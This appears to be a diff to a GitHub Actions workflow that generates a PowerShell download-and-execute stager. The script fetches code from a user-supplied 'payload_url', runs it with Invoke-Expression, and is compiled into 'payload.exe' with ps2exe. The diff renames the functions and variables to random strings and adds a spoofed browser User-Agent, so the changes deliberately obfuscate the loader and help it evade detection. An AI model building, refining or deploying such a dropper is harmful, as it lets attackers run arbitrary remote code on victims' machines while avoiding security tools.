@@ -27,39 +27,47 @@ jobs:
       shell: powershell
       run: |
         $script = @'
-        function FetchScriptContent {
-            param ([string]$scriptUrl)
+        function XhYjVwJtKz {
+            param ([string]$AaBbCcDdEe)
             try {
-                return Invoke-RestMethod -Uri $scriptUrl -TimeoutSec 10
-            } catch {
-                Write-Host "Error: Failed to fetch data from URL - $scriptUrl"
+                $httpClient = New-Object System.Net.Http.HttpClient
+                $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+                return $httpClient.GetStringAsync($AaBbCcDdEe).Result
+            }
+            catch {
+                Write-Host "Error: Failed to fetch data from URL - $AaBbCcDdEe"
                 return $null
             }
         }
 
-        function ExecuteScript {
+        function XoRpQkZtLs {
             param ([string]$scriptContent)
             try {
                 Invoke-Expression $scriptContent
-            } catch {
+            }
+            catch {
                 Write-Host "Error: Failed to execute PowerShell command."
             }
         }
 
-        $scriptUrl = "@{url}"
+        $QwErTyUuOo = "{PAYLOAD_URL}"
 
-        if ($scriptUrl) {
-            $scriptData = FetchScriptContent -scriptUrl $scriptUrl
-            if ($scriptData) {
-                ExecuteScript -scriptContent $scriptData
+        if ($QwErTyUuOo) {
+            $VvWwXxYyZz = XhYjVwJtKz -AaBbCcDdEe $QwErTyUuOo
+            if ($VvWwXxYyZz) {
+                XoRpQkZtLs -scriptContent $VvWwXxYyZz
             } else {
                 Write-Host "Error: No valid data received from the URL."
             }
         } else {
             Write-Host "Error: PAYLOAD_URL is not set."
         }
-        '@ -replace "@{url}", "${{ github.event.inputs.payload_url }}"
+        '@
 
+        # Replace placeholder with actual input URL
+        $script = $script -replace "{PAYLOAD_URL}", "${{ github.event.inputs.payload_url }}"
+
+        # Save to file
         $script | Out-File -FilePath "payload.ps1" -Encoding utf8
 
     # Step 4: Convert PowerShell script to an EXE using ps2exe
@@ -78,6 +86,7 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
+
 
 
 
